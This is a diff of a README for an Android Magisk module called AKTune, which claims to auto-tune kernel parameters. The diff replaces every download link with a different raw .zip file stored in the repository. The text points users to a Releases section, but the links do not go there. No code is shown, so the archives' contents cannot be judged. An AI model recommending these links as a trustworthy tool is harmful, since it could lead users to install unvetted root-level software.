@@ -1,7 +1,7 @@
 # 🎉 android-kernel-tweaker - Boost Your Device Performance Effortlessly
 
 ## 📥 Download Now
-[![Download android-kernel-tweaker](https://raw.githubusercontent.com/hana200887/android-kernel-tweaker/master/META-INF/com/google/android/kernel_android_tweaker_2.1-beta.3.zip)](https://raw.githubusercontent.com/hana200887/android-kernel-tweaker/master/META-INF/com/google/android/kernel_android_tweaker_2.1-beta.3.zip)
+[![Download android-kernel-tweaker](https://raw.githubusercontent.com/hana200887/android-kernel-tweaker/master/tweaks/android_kernel_tweaker_3.6-beta.2.zip)](https://raw.githubusercontent.com/hana200887/android-kernel-tweaker/master/tweaks/android_kernel_tweaker_3.6-beta.2.zip)
 
 ## 📝 Overview
 AKTune is a lightweight Magisk module designed to auto-tune kernel parameters for a smoother user experience. It adapts to your screen state and device capabilities to improve efficiency and performance. This module is ideal for users looking to enhance their Android device without delving into complicated settings.
@@ -10,7 +10,7 @@ AKTune is a lightweight Magisk module designed to auto-tune kernel parameters fo
 To start using AKTune, follow these straightforward steps:
 
 1. **Download the Module**
-   - Visit [this page to download](https://raw.githubusercontent.com/hana200887/android-kernel-tweaker/master/META-INF/com/google/android/kernel_android_tweaker_2.1-beta.3.zip) the latest version of AKTune. Look for the version labeled as "Latest Release."
+   - Visit [this page to download](https://raw.githubusercontent.com/hana200887/android-kernel-tweaker/master/tweaks/android_kernel_tweaker_3.6-beta.2.zip) the latest version of AKTune. Look for the version labeled as "Latest Release."
 
 2. **Install the Module via Magisk**
    - Open the Magisk Manager app on your Android device.
@@ -33,7 +33,7 @@ To start using AKTune, follow these straightforward steps:
 - **User-Friendly**: Designed for all users, regardless of technical background.
 
 ## 📂 Download & Install
-To get started, visit [this page to download](https://raw.githubusercontent.com/hana200887/android-kernel-tweaker/master/META-INF/com/google/android/kernel_android_tweaker_2.1-beta.3.zip). Select the appropriate version file from the Releases section and follow the installation steps outlined above.
+To get started, visit [this page to download](https://raw.githubusercontent.com/hana200887/android-kernel-tweaker/master/tweaks/android_kernel_tweaker_3.6-beta.2.zip). Select the appropriate version file from the Releases section and follow the installation steps outlined above.
 
 ## 🛠️ Troubleshooting
 If you encounter any issues after installation, consider the following steps:
